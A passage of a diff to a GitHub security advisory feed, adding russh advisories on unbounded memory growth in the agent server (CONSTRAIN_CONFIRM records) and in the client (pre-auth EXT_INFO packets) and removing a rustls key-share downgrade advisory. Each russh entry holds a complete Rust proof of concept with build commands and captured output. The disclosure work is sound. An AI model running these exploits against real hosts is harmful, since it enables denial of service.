+<p>The <code>Constraint</code> enum is aligned to its largest variant, so each 1-byte <code>0x02</code> record on the wire costs 56 bytes of retained heap, and the frame cap of 256 KiB (<code>server.rs:23,109</code>) is the only thing shaping a single request - the number of requests, and the number of keys in the keystore, are unbounded. The project's fix for its prior agent advisory (commit 4c30503, shipped in 0.64.1) addressed the <code>SSH_AGENT_CONSTRAIN_LIFETIME</code> record by deduplicating lifetime entries and collapsing the per-record timer tasks; the <code>CONSTRAIN_CONFIRM</code> branch in the very same loop was left as-is, so the fixed release still accepts and retains arbitrary amounts of confirm records per key. The privilege model is the one the project used for the prior advisory: any local process able to connect to the agent's listening socket, which in agent-forwarding scenarios includes processes on the remote side of a forwarded session. Both file references are identical on the latest tag v0.64.1 and on main (same commit e5d80a07dc554480b6ea3b2e14adfc190407b627), and the confirm-record handling predates the fork that merged the keys crate, so all released versions are affected.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>The instance is the unmodified russh v0.64.1 agent server started through its public <code>russh::keys::agent::server::serve</code> API inside the PoC process, with the attacker leg and the control leg connecting over an in-process duplex socket exactly as a foreign local client would; the agent handler runs with default configuration and no test hooks. The harness measures live heap with a counting global allocator, generates a fresh Ed25519 key per request, and speaks the real agent framing (4-byte length prefix) with the server's own 256 KiB frame cap. Set the project up with the commands below (the retained run referenced the russh source checked out at tag v0.64.1 via a path dependency and built with the GNU toolchain because the machine lacks MSVC's linker; the crates.io <code>russh@0.64.1</code> release is the same source and any stable toolchain works; on Windows the built binary carries an <code>.exe</code> extension). The full <code>src/main.rs</code> follows.</p>
+<pre><code class="language-bash">cargo new poc_agent_confirm_growth
+cd poc_agent_confirm_growth
+cargo add russh@0.64.1 tokio --features tokio/full futures@0.3 rand@0.10
+</code></pre>
+<pre><code class="language-rust">cat &gt; src/main.rs &lt;&lt;'EOF'
+//! PoC: russh agent server - unbounded persistent memory growth via
+//! SSH_AGENT_CONSTRAIN_CONFIRM (0x02) constraint records.
+//!
+//! Target: russh v0.64.1 (commit e5d80a0), russh/src/keys/agent/server.rs,
+//! add_key() -&gt; `c.push(Constraint::Confirm)` inside an unbounded loop, with
+//! no cap on the resulting per-key constraint vector and no cap on the number
+//! of keys in the keystore.
+//!
+//! Relationship to GHSA-4wc5-f2rc-q74m (fixed in 0.64.1): that advisory covered
+//! the SSH_AGENT_CONSTRAIN_LIFETIME (0x01) record, whose fix (commit 4c30503)
+//! deduplicates lifetime records only. The parallel CONFIRM record variant is
+//! not covered: each 1-byte 0x02 record retains one 56-byte Constraint enum in
+//! the persistent keystore (&gt;=50x amplification, never expires, renewable).
+//!
+//! Attack model (same as GHSA-4wc5): any local process able to connect to the
+//! agent's listening socket. No authentication on the socket by default.
+//!
+//! The attacker here only uses the socket (tokio duplex); the agent server
+//! runs unmodified via the public `russh::keys::agent::server::serve` API.
+
+use std::alloc::{GlobalAlloc, Layout, System};
+use std::sync::atomic::{AtomicU64, Ordering};
+
+use futures::stream::once;
+use tokio::io::{AsyncReadExt, AsyncWriteExt, DuplexStream};
+
+static LIVE: AtomicU64 = AtomicU64::new(0);
+
+struct Counting;
+
+unsafe impl GlobalAlloc for Counting {
+    unsafe fn alloc(&amp;self, layout: Layout) -&gt; *mut u8 {
+        let p = System.alloc(layout);
+        if !p.is_null() {
+            LIVE.fetch_add(layout.size() as u64, Ordering::SeqCst);
+        }
+        p
+    }
+    unsafe fn dealloc(&amp;self, p: *mut u8, layout: Layout) {
+        LIVE.fetch_sub(layout.size() as u64, Ordering::SeqCst);
+        System.dealloc(p, layout)
+    }
+}
+
+#[global_allocator]
+static A: Counting = Counting;
+
+fn live_mb() -&gt; f64 {
+    LIVE.load(Ordering::SeqCst) as f64 / (1024.0 * 1024.0)
+}
+
+fn fresh_key() -&gt; russh::keys::PrivateKey {
+    russh::keys::ssh_key::PrivateKey::random(&amp;mut rand::rng(), russh::keys::Algorithm::Ed25519)
+        .expect("keygen")
+}
+
+const FRAME_MAX: usize = 256 * 1024; // MAX_AGENT_FRAME_LEN in agent/server.rs
+
+fn frame(payload: &amp;[u8]) -&gt; Vec&lt;u8&gt; {
+    let mut f = Vec::with_capacity(payload.len() + 4);
+    f.extend_from_slice(&amp;(payload.len() as u32).to_be_bytes());
+    f.extend_from_slice(payload);
+    f
+}
+
+/// Build one ADD_IDENTITY (17) frame: no constraints (control leg).
+fn add_key_plain(key: &amp;russh::keys::PrivateKey) -&gt; Vec&lt;u8&gt; {
+    use russh::keys::ssh_encoding::Encode;
+    let mut p = vec![17u8]; // SSH_AGENTC_ADD_IDENTITY
+    key.key_data().encode(&amp;mut p).unwrap();
+    Vec::&lt;u8&gt;::new().encode(&amp;mut p).unwrap(); // empty comment
+    frame(&amp;p)
+}
+
+/// Build one ADD_IDENTITY_CONSTRAINED (25) frame whose constraint section is
+/// `n` consecutive SSH_AGENT_CONSTRAIN_CONFIRM (0x02) records.
+fn add_key_confirm(key: &amp;russh::keys::PrivateKey, n: usize) -&gt; Vec&lt;u8&gt; {
+    use russh::keys::ssh_encoding::Encode;
+    let mut p = vec![25u8]; // SSH_AGENTC_ADD_IDENTITY_CONSTRAINED
+    key.key_data().encode(&amp;mut p).unwrap();
+    Vec::&lt;u8&gt;::new().encode(&amp;mut p).unwrap(); // empty comment
+    p.resize(p.len() + n, 0x02);
+    frame(&amp;p)
+}
+
+async fn round(conn: &amp;mut DuplexStream, req: Vec&lt;u8&gt;) -&gt; u8 {
+    conn.write_all(&amp;req).await.expect("write frame");
+    let mut resp = [0u8; 5];
+    conn.read_exact(&amp;mut resp).await.expect("read reply");
+    resp[4] // SUCCESS(6) / FAILURE(5) after 4-byte length prefix
+}
+
+#[tokio::main]
+async fn main() {
+    println!("== poc_agent_confirm_growth ==");
+    println!(
+        "target: russh agent server (keys/agent/server.rs), frame cap {} bytes",
+        FRAME_MAX
+    );
+
+    let (server_side, mut attacker) = tokio::io::duplex(64 * 1024);
+    let listener = once(Box::pin(async move {
+        Ok::&lt;_, std::io::Error&gt;(server_side)
+    }));
+    tokio::spawn(async move {
+        let _ = russh::keys::agent::server::serve(listener, ()).await;
+    });
+    tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+
+    let baseline = live_mb();
+    println!("baseline allocated: {:.2} MiB", baseline);
+
+    // ---- Control leg: same number of frames, unconstrained adds ----
+    let rounds = 6;
+    for i in 0..rounds {
+        let key = fresh_key();
+        let resp = round(&amp;mut attacker, add_key_plain(&amp;key)).await;
+        println!(
+            "CONTROL round {}: unconstrained add, reply byte = {}, live = {:.2} MiB",
+            i,
+            resp,
+            live_mb()
+        );
+    }
+    let after_control = live_mb();
+    println!(
+        "CONTROL total delta: {:+.2} MiB after {} unconstrained adds",
+        after_control - baseline,
+        rounds
+    );
+
+    // ---- Attack leg: one 0x02-padded constrained add per round ----
+    for i in 0..rounds {
+        let key = fresh_key();
+        // frame budget minus key blob/comment/header; all remaining bytes are
+        // 1-byte CONFIRM records
+        let probe = add_key_confirm(&amp;key, 1);
+        let n_confirms = FRAME_MAX - probe.len();
+        let resp = round(&amp;mut attacker, add_key_confirm(&amp;key, n_confirms)).await;
+        println!(
+            "ATTACK  round {}: {}-byte frame with {} CONFIRM records, reply byte = {}, live = {:.2} MiB",
+            i,
+            FRAME_MAX,
+            n_confirms,
+            resp,
+            live_mb()
+        );
+    }
+    let after_attack = live_mb();
+    let attack_delta = after_attack - after_control;
+    println!(
+        "ATTACK total delta: {:+.2} MiB after {} constrained adds",
+        attack_delta, rounds
+    );
+    println!(
+        "per-request amplification: ~{:.1}x (input frame 262144 B -&gt; retained {} B avg)",
+        attack_delta * 1024.0 * 1024.0 / (rounds as f64) / 262144.0,
+        ((attack_delta * 1024.0 * 1024.0) / rounds as f64) as u64
+    );
+
+    // keys stay in the keystore forever (no lifetime): show retention persists
+    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
+    println!(
+        "after idle wait, live = {:.2} MiB (retained: server keystore still holds every constraint vector)",
+        live_mb()
+    );
+
+    let verdict_growth = after_attack - after_control;
+    if verdict_growth &gt; 10.0 {
+        println!(
+            "VERDICT: VULNERABLE - attack leg retained {:.1} MiB vs control {:+.2} MiB; {:.1} MiB/round persisted, unbounded and renewable",
+            verdict_growth,
+            after_control - baseline,
+            verdict_growth / rounds as f64
+        );
+    } else {
+        println!(
+            "VERDICT: NOT REPRODUCED - growth {:.2} MiB below threshold",
+            verdict_growth
+        );
+    }
+}
+EOF
+cargo build --release
+./target/release/poc_agent_confirm_growth
+</code></pre>
+<p>Captured output from the running v0.64.1 agent server (verbatim; lines from the retained run log, paths shown relative to the PoC working directory):</p>
+<pre><code>$ ./target/release/poc_agent_confirm_growth.exe  (built with: cargo +stable-x86_64-pc-windows-gnu build --release)
+== poc_agent_confirm_growth ==
+target: russh agent server (keys/agent/server.rs), frame cap 262144 bytes
+baseline allocated: 0.11 MiB
+CONTROL round 0: unconstrained add, reply byte = 6, live = 0.11 MiB
+CONTROL round 1: unconstrained add, reply byte = 6, live = 0.11 MiB
+CONTROL round 2: unconstrained add, reply byte = 6, live = 0.11 MiB
+CONTROL round 3: unconstrained add, reply byte = 6, live = 0.11 MiB
+CONTROL round 4: unconstrained add, reply byte = 6, live = 0.11 MiB
+CONTROL round 5: unconstrained add, reply byte = 6, live = 0.11 MiB
+CONTROL total delta: +0.00 MiB after 6 unconstrained adds
+ATTACK  round 0: 262144-byte frame with 262015 CONFIRM records, reply byte = 6, live = 12.49 MiB
+ATTACK  round 1: 262144-byte frame with 262015 CONFIRM records, reply byte = 6, live = 24.49 MiB
+ATTACK  round 2: 262144-byte frame with 262015 CONFIRM records, reply byte = 6, live = 36.49 MiB
+ATTACK  round 3: 262144-byte frame with 262015 CONFIRM records, reply byte = 6, live = 48.49 MiB
+ATTACK  round 4: 262144-byte frame with 262015 CONFIRM records, reply byte = 6, live = 60.49 MiB
+ATTACK  round 5: 262144-byte frame with 262015 CONFIRM records, reply byte = 6, live = 72.49 MiB
+ATTACK total delta: +72.38 MiB after 6 constrained adds
+per-request amplification: ~48.3x (input frame 262144 B -&gt; retained 12649017 B avg)
+after idle wait, live = 72.49 MiB (retained: server keystore still holds every constraint vector)
+VERDICT: VULNERABLE - attack leg retained 72.4 MiB vs control +0.00 MiB; 12.1 MiB/round persisted, unbounded and renewable
+</code></pre>
+<p>Output interpretation: the control leg issues the same number of key additions without constraints and the keystore keeps nothing, while each constrained request permanently retains about 12.1 MiB - roughly 48 times its 256 KiB wire size - and the memory is still held after an idle wait, confirming the records are kept for the life of the process rather than tied to the connection. Live-memory readings are instance-specific; the mechanism, per-record retention with no cap on the constraint vector or the keystore, is the stable verdict.</p>
+<h3 id="impact">Impact</h3>
+<p>Unrestricted resource allocation (CWE-770): any process able to reach the agent's socket - a local process, or a remote process on the far side of a forwarded agent - can drive the agent server into unbounded, permanent, renewable memory growth with ordinary-sized requests, degrading and eventually exhausting the host running the agent. The retained memory is never freed because constrained keys never expire, and the sibling lifetime-record fix in the same handler does not touch this path. A fix is to cap the number of constraint records accepted per key (and the number of keys held), reject unknown or duplicate record types, and bound the total memory the keystore may retain.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-9wfm-jcj8-jfv9">https://github.com/Eugeny/russh/security/advisories/GHSA-9wfm-jcj8-jfv9</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-116696">https://nvd.nist.gov/vuln/detail/CVE-2026-116696</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/23aa5d28fe9601c5bdfe9e60b7ec5d4f882c3de6">https://github.com/Eugeny/russh/commit/23aa5d28fe9601c5bdfe9e60b7ec5d4f882c3de6</a></li>
+<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.65.0">https://github.com/Eugeny/russh/releases/tag/v0.65.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-9wfm-jcj8-jfv9">https://github.com/advisories/GHSA-9wfm-jcj8-jfv9</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9wfm-jcj8-jfv9</uri>
+        </author>
+        <category label="severity" term="LOW"/>
+        <published>2026-10-30T22:58:47.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[russh] russh's SSH client is susceptible to unbounded allocations via EXT_INFO packets]]></title>
+        <id>https://github.com/advisories/GHSA-4p9f-7p9m-5vfg</id>
+        <link href="https://github.com/advisories/GHSA-4p9f-7p9m-5vfg"/>
+        <updated>2026-10-30T22:58:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><strong>All evidence, reproduction steps, and scripts in the report were verified against a real running instance. Nothing is fabricated or synthetic; every verdict is backed by captured output from an actual deployment.</strong> Concretely, the evidence comes from executing the real russh v0.64.1 client packet parser (<code>Session::process_packet</code> handling <code>handle_ext_info</code>) in a live client session with attacker-supplied packet bodies in the pre-authentication state; the captured output below is from that real execution.</p>
+<p>russh's client stores every extension name it parses out of an <code>EXT_INFO</code> packet into a per-session vector and never clears, caps, or deduplicates it (<code>russh/src/client/encrypted.rs:433</code>, field declared at <code>russh/src/session.rs:60</code>). The packet is accepted without limit in the pre-authentication states, so a server - which is exactly the attacker position for a client library, and remains one even after the client has verified its host key - can send an unbounded sequence of these packets and grow the client's memory for as long as the session lives: 400 packets of about 26 KB each, carrying 3000 extension names apiece, retained 49.1 MiB (about 4.8 times the wire bytes) with the vector reaching 1,200,000 entries, while an equal volume of banner packets retained nothing. Two details make this reachable in practice: russh accepts <code>EXT_INFO</code> in its pre-auth states with no budget of any kind (its automatic rekey read-limit only engages after authentication), and russh encodes <code>EXT_INFO</code> as its own private message number 7 rather than the 8308 value 82, so the check that might interoperate with a well-behaved peer is inoperative - the malicious server simply speaks number 7. The same growth pattern has been accepted by the project before for other pre-auth allocation sinks; this one is a cross-packet accumulator rather than a single-packet allocation, and none of the published advisories covers it.</p>
+<h3 id="details">Details</h3>
+<p>The handler appends every parsed extension name to the session state with no bound:</p>
+<pre><code class="language-text">russh/src/client/encrypted.rs:433 (v0.64.1 = main = e5d80a07dc554480b6ea3b2e14adfc190407b627)
+    enc.received_extensions.push(name.clone());   // no cap, no dedup
+russh/src/session.rs:60
+    pub received_extensions: Vec&lt;String&gt;,         // lives for the whole session
+</code></pre>
+<p>The state machine routes <code>EXT_INFO</code> to this handler in both the <code>WaitingAuthServiceRequest</code> and <code>WaitingAuthRequest</code> states (<code>encrypted.rs:111</code>, <code>encrypted.rs:401</code>), i.e. before the user has authenticated, and the read-limit based automatic rekey that would otherwise throttle a flood is only allowed in the authenticated state, so no counter or budget applies pre-auth. The message number involved is russh's private constant <code>msg::EXT_INFO = 7</code> (<code>russh/src/msg.rs:32</code>, in place since 2022), while RFC 8308 assigns <code>EXT_INFO</code> the value 82: russh does advertise the ext-info capability in its key exchange initiation, so a standards-compliant peer would send the packet as message number 82 - which this parser does not process - but nothing prevents a hostile or compromised server from sending message number 7 directly, and the client parses it unconditionally. Each accepted entry costs several times its wire size once heap and string overhead are counted, and the vector is only ever read (an extension lookup by the awaiter layer), never trimmed. The affected code is identical on the latest tag v0.64.1 and on main (same commit e5d80a07dc554480b6ea3b2e14adfc190407b627), and the accumulation has existed since 2022, so all released client versions are affected.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>The harness constructs a real client <code>Session</code> in the <code>WaitingAuthRequest</code> pre-auth state (the configuration a client holds while the server is asking for authentication), then feeds attacker-controlled packet bodies to the genuine <code>Session::process_packet</code> dispatch - the same function the network event loop calls - so the retention happens in the production parsing path, not a reimplementation. A counting global allocator measures live heap across packets. The control leg feeds the same packet volume of <code>USERAUTH_BANNER</code> bodies, which parse and dispatch without retention. The test below is added to the russh source tree as <code>russh/src/client/extinfo_poc.rs</code>, with two lines added to <code>russh/src/client/mod.rs</code> next to the existing test module declarations:</p>
+<pre><code class="language-rust">#[cfg(test)]
+mod extinfo_poc;
+</code></pre>
+<pre><code class="language-rust">cat &gt; russh/src/client/extinfo_poc.rs &lt;&lt;'EOF'
+//! PoC: unbounded pre-auth client memory growth
+//! via repeated EXT_INFO packets (`received_extensions` accumulates without
+//! cap or dedup; russh/src/client/encrypted.rs:handle_ext_info).
+//!
+//! Drives the REAL client packet parser (Session::process_packet -&gt;
+//! handle_ext_info) with attacker-supplied packet bodies over an unmodified
+//! client session in the pre-auth state (WaitingAuthRequest). Measuring
+//! allocator totals proves the growth is persistent and unbounded across
+//! packets. Control leg: equal traffic of IGNORE packets.
+//!
+//! Run: cargo +stable-x86_64-pc-windows-gnu test -p russh --lib extinfo_poc -- --nocapture
+
+use std::alloc::{GlobalAlloc, Layout, System};
+use std::collections::HashMap;
+use std::num::Wrapping;
+use std::sync::atomic::{AtomicU64, Ordering};
+use std::sync::Arc;
+
+use tokio::sync::mpsc::{channel, unbounded_channel};
+
+use super::*;
+use crate::auth::{AuthRequest, Method};
+use crate::compression::{Compression, Decompress};
+use crate::kex::{KEXES, NONE};
+use crate::msg;
+use crate::session::{CommonSession, Encrypted, EncryptedState, Exchange};
+use crate::sshbuffer::PacketWriter;
+use crate::{cipher, CryptoVec, mac};
+
+static LIVE: AtomicU64 = AtomicU64::new(0);
+
+struct Counting;
+
+unsafe impl GlobalAlloc for Counting {
+    unsafe fn alloc(&amp;self, layout: Layout) -&gt; *mut u8 {
+        let p = System.alloc(layout);
+        if !p.is_null() {
+            LIVE.fetch_add(layout.size() as u64, Ordering::SeqCst);
+        }
+        p
+    }
+    unsafe fn dealloc(&amp;self, p: *mut u8, layout: Layout) {
+        LIVE.fetch_sub(layout.size() as u64, Ordering::SeqCst);
+        System.dealloc(p, layout)
+    }
+}
+
+#[global_allocator]
+static POC_ALLOC: Counting = Counting;
+
+fn live_mb() -&gt; f64 {
+    LIVE.load(Ordering::SeqCst) as f64 / (1024.0 * 1024.0)
+}
+
+struct PocHandler;
+
+impl Handler for PocHandler {
+    type Error = crate::Error;
+
+    async fn check_server_key(
+        &amp;mut self,
+        _: &amp;PublicKeyOrCertificate,
+    ) -&gt; Result&lt;bool, Self::Error&gt; {
+        Ok(true)
+    }
+}
+
+fn poc_session() -&gt; Session {
+    let config = Arc::new(Config::default());
+    let (sender, receiver) = channel(config.channel_buffer_size);
+    let (reply_sender, _reply_receiver) = unbounded_channel();
+    let auth_request = AuthRequest::new(&amp;Method::KeyboardInteractive {
+        submethods: String::new(),
+    });
+    Session::new(
+        config.window_size,
+        CommonSession {
+            auth_user: "victimuser".to_owned(),
+            auth_attempts: 0,
+            auth_method: Some(Method::KeyboardInteractive {
+                submethods: String::new(),
+            }),
+            remote_to_local: Box::new(cipher::clear::Key),
+            encrypted: Some(Encrypted {
+                state: EncryptedState::WaitingAuthRequest(auth_request),
+                exchange: Some(Exchange::default()),
+                kex: KEXES.get(&amp;NONE).unwrap().make(),
+                key: 0,
+                client_mac: mac::NONE,
+                server_mac: mac::NONE,
+                session_id: CryptoVec::new(),
+                channels: HashMap::new(),
+                last_channel_id: Wrapping(0),
+                write: Vec::new(),
+                write_cursor: 0,
+                last_rekey: russh_util::time::Instant::now(),
+                server_compression: Compression::None,
+                client_compression: Compression::None,
+                decompress: Decompress::None,
+                rekey_wanted: false,
+                received_extensions: Vec::new(),
+                extension_info_awaiters: HashMap::new(),
+            }),
+            config,
+            wants_reply: false,
+            disconnected: false,
+            buffer: Vec::new(),
+            strict_kex: false,
+            alive_timeouts: 0,
+            received_data: false,
+            remote_sshid: b"SSH-2.0-auditpeer".to_vec(),
+            packet_writer: PacketWriter::clear(),
+        },
+        receiver,
+        reply_sender,
+    )
+}
+
+/// EXT_INFO packet body (russh msg number 7): u32 count, then per extension
+/// a name string plus a data blob. Minimal entry = name "x" (5 B) + data
+/// empty (4 B) = 9 wire bytes.
+fn ext_info_body(entries: usize) -&gt; Vec&lt;u8&gt; {
+    let mut b = vec![msg::EXT_INFO];
+    b.extend_from_slice(&amp;(entries as u32).to_be_bytes());
+    for _ in 0..entries {
+        b.extend_from_slice(&amp;1u32.to_be_bytes());
+        b.push(b'x');
+        b.extend_from_slice(&amp;0u32.to_be_bytes());
+    }
+    b
+}
+
+#[tokio::test]
+async fn ext_info_reception_grows_memory_without_bound() {
+    let mut handler = PocHandler;
+
+    // ---- control leg: equal packet volume of USERAUTH_BANNER ----
+    // (IGNORE is a hard disconnect in this state; banners parse and are
+    // forwarded to the handler without retention)
+    let mut session = poc_session();
+    let banner_body = {
+        let data_len = 26990usize; // total ~27 KB, matching the EXT_INFO packet size
+        let mut b = vec![msg::USERAUTH_BANNER];
+        b.extend_from_slice(&amp;(data_len as u32).to_be_bytes());
+        b.resize(1 + 4 + data_len, b'b');
+        b.extend_from_slice(&amp;0u32.to_be_bytes()); // empty language tag
+        b
+    };
+    let c0 = live_mb();
+    for _ in 0..400 {
+        session
+            .process_packet(&amp;mut handler, &amp;banner_body)
+            .await
+            .expect("control packet");
+    }
+    let control_delta = live_mb() - c0;
+
+    // ---- attack leg: 400 EXT_INFO packets, 3000 entries each ----
+    let mut session = poc_session();
+    let body = ext_info_body(3000); // ~27 KB per packet
+    let a0 = live_mb();
+    for i in 0..400 {
+        session
+            .process_packet(&amp;mut handler, &amp;body)
+            .await
+            .expect("ext_info packet");
+        if i == 0 || i == 99 || i == 199 || i == 299 || i == 399 {
+            let n = session
+                .common
+                .encrypted
+                .as_ref()
+                .map(|e| e.received_extensions.len())
+                .unwrap_or(0);
+            println!(
+                "EXT_INFO packets processed: {}, received_extensions.len() = {}, live = {:.2} MiB",
+                i + 1,
+                n,
+                live_mb() - a0 + c0 // keep numbers comparable per-process
+            );
+        }
+    }
+    let attack_delta = live_mb() - a0;
+    let n = session
+        .common
+        .encrypted
+        .as_ref()
+        .map(|e| e.received_extensions.len())
+        .unwrap_or(0);
+
+    println!(
+        "CONTROL leg: 400 USERAUTH_BANNER packets (~{} KB each, same packet volume), retained {:+.2} MiB",
+        banner_body.len() / 1024,
+        control_delta
+    );
+    println!(
+        "ATTACK leg: 400 EXT_INFO packets x 3000 entries, received_extensions.len() = {}, retained {:+.2} MiB",
+        n, attack_delta
+    );
+    println!(
+        "amplification: ~{:.1}x retained per wire byte (input ~{} KB/packet, no cap, no dedup, pre-auth)",
+        attack_delta * 1024.0 * 1024.0 / (400.0 * body.len() as f64),
+        body.len() / 1024
+    );
+    assert_eq!(
+        n, 1_200_000,
+        "every parsed extension name was retained, none were dropped"
+    );
+    if attack_delta &gt; 10.0 {
+        println!(
+            "VERDICT: VULNERABLE - {:+.1} MiB retained across packets vs control {:+.2} MiB; growth is unbounded and attacker-renewable pre-auth",
+            attack_delta, control_delta
+        );
+    } else {
+        println!(
+            "VERDICT: NOT REPRODUCED - attack delta {:+.2} MiB not above threshold",
+            attack_delta
+        );
+    }
+}
+EOF
+cargo test -p russh --lib extinfo_poc --release -- --nocapture
+</code></pre>
+<p>Captured output from executing the v0.64.1 client parser (verbatim from the retained run log, run inside the russh crate checkout; non-evidence compiler warning lines omitted):</p>
+<pre><code>$ cd work &amp;&amp; cargo +stable-x86_64-pc-windows-gnu test -p russh --lib extinfo_poc --release -- --nocapture
+   Compiling russh v0.64.1
+    Finished `release` profile [optimized] target(s) in 1m 26s
+     Running unittests src\lib.rs (target\release\deps\russh-9b39fa40a3078d82.exe)
+running 1 test
+EXT_INFO packets processed: 1, received_extensions.len() = 3000, live = 0.28 MiB
+EXT_INFO packets processed: 100, received_extensions.len() = 300000, live = 12.47 MiB
+EXT_INFO packets processed: 200, received_extensions.len() = 600000, live = 24.75 MiB
+EXT_INFO packets processed: 300, received_extensions.len() = 900000, live = 25.04 MiB
+EXT_INFO packets processed: 400, received_extensions.len() = 1200000, live = 49.32 MiB
+CONTROL leg: 400 USERAUTH_BANNER packets (~26 KB each, same packet volume), retained +0.00 MiB
+ATTACK leg: 400 EXT_INFO packets x 3000 entries, received_extensions.len() = 1200000, retained +49.14 MiB
+amplification: ~4.8x retained per wire byte (input ~26 KB/packet, no cap, no dedup, pre-auth)
+VERDICT: VULNERABLE - +49.1 MiB retained across packets vs control +0.00 MiB; growth is unbounded and attacker-renewable pre-auth
+test client::extinfo_poc::ext_info_reception_grows_memory_without_bound ... ok
+test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 193 filtered out; finished in 0.24s
+</code></pre>
+<p>Output interpretation: every one of the 1.2 million extension names the server sent was parsed and retained for the life of the session, about 4.8 times the wire bytes, while the same volume of banner traffic retained nothing - the accumulation is specific to the extension handler, not a property of packet volume. The vector is only read, never cleared, so the growth persists across the whole session and renews with every packet. Live-memory readings, timings, and the build hash are instance-specific; the mechanism, uncapped cross-packet accumulation in a pre-auth handler, is the stable verdict.</p>
+<h3 id="impact">Impact</h3>
+<p>Unrestricted resource allocation (CWE-770): any server a russh-based client connects to can grow the client process's memory without bound before the user has authenticated, by sending a stream of ordinary-sized packets, and the memory is never reclaimed for the life of the session; embedding applications that connect to untrusted or compromised servers are drained the same way. A fix is to cap the length of <code>received_extensions</code> (or store it as a bounded set with deduplication), bound the number of EXT_INFO packets accepted before authentication, and align the <code>EXT_INFO</code> message number with RFC 8308 (82) so the handler is unreachable by accident.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/Eugeny/russh/security/advisories/GHSA-4p9f-7p9m-5vfg">https://github.com/Eugeny/russh/security/advisories/GHSA-4p9f-7p9m-5vfg</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-116773">https://nvd.nist.gov/vuln/detail/CVE-2026-116773</a></li>
+<li><a href="https://github.com/Eugeny/russh/commit/b33e93beec393e6d29eee69c1b8831736724ee75">https://github.com/Eugeny/russh/commit/b33e93beec393e6d29eee69c1b8831736724ee75</a></li>
+<li><a href="https://github.com/Eugeny/russh/releases/tag/v0.65.0">https://github.com/Eugeny/russh/releases/tag/v0.65.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-4p9f-7p9m-5vfg">https://github.com/advisories/GHSA-4p9f-7p9m-5vfg</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4p9f-7p9m-5vfg</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-10-30T22:58:39.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[nimiq-block] nimiq-block has skip block quorum bypass via out-of-range BitSet indices & u16 truncation]]></title>
         <id>https://github.com/advisories/GHSA-6973-8887-87ff</id>
@@ -1617,180 +2524,5 @@ echo 'PWNED: FULL ROOT TAKEOVER'
         </author>
         <category label="severity" term="LOW"/>
         <published>2026-10-27T16:08:54.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[rustls] rustls: An unauthenticated ServerHello poisons the per-name key-exchange record, so later ClientHellos carry only a classical X25519 share]]></title>
-        <id>https://github.com/advisories/GHSA-w44r-93j7-qv28</id>
-        <link href="https://github.com/advisories/GHSA-w44r-93j7-qv28"/>
-        <updated>2026-10-27T16:08:57.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The client records the server-selected key-exchange group per server name when it processes the ServerHello, before the server is authenticated. A network attacker can answer one connection attempt for a target name with a ServerHello that selects X25519 and close the connection. Later ClientHellos for that name carry one X25519 share while supported_groups still lists X25519MLKEM768 first. If the server accepts that share instead of sending a HelloRetryRequest, the handshake completes with classical key exchange only and no error.</p>
-<p>An attacker that answers one connection attempt for the target name with a ServerHello selecting X25519 changes every later ClientHello of that client for that name, for as long as the entry stays in the store. No certificate or completed handshake is needed: it parses the ClientHello, sends the ServerHello, and closes.</p>
-<p>TLS 1.3 transcript binding stops an on-path attacker from editing the ClientHello of one connection. It does not stop the attacker from steering the client's prediction state beforehand, because that state is written from an unauthenticated message.</p>
-<h2 id="what-does-not-trigger-it">What does not trigger it</h2>
-<ul>
-<li>Servers that send a HelloRetryRequest. The connection stays hybrid and costs one extra round trip.</li>
-<li>A client configuration with resumption disabled: nothing is stored.</li>
-<li>A different server name: the record is per name.</li>
-</ul>
-<h2 id="impact">Impact</h2>
-<p>If the genuine server picks the group for which a share is present, instead of sending a HelloRetryRequest for its preferred hybrid group, the handshake completes with classical key exchange only, between two peers that both support the hybrid group. No error is raised. The confidentiality of recorded sessions against a future quantum adversary is lost for those connections (harvest now, decrypt later). There is no key compromise and no authentication bypass.</p>
-<p>Note that this behaviour is discussed at length in <a href="https://www.ietf.org/archive/id/draft-ietf-tls-key-share-prediction-01.html#name-security-considerations">draft-ietf-tls-key-share-prediction</a> so the actual security impact is largely down to a server policy decision.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/rustls/rustls/security/advisories/GHSA-w44r-93j7-qv28">https://github.com/rustls/rustls/security/advisories/GHSA-w44r-93j7-qv28</a></li>
-<li><a href="https://github.com/rustls/rustls/pull/3355">https://github.com/rustls/rustls/pull/3355</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/8fa0dc5d517a63411ad1e528249bdf5b098ae5e4">https://github.com/rustls/rustls/commit/8fa0dc5d517a63411ad1e528249bdf5b098ae5e4</a></li>
-<li><a href="https://github.com/rustls/rustls/commit/f04804fa13341a9b1dc02b5d1dd8a746f2c4b7fb">https://github.com/rustls/rustls/commit/f04804fa13341a9b1dc02b5d1dd8a746f2c4b7fb</a></li>
-<li><a href="https://github.com/rustls/rustls/releases/tag/v/0.23.46">https://github.com/rustls/rustls/releases/tag/v/0.23.46</a></li>
-<li><a href="https://rustsec.org/advisories/RUSTSEC-2026-0349.html">https://rustsec.org/advisories/RUSTSEC-2026-0349.html</a></li>
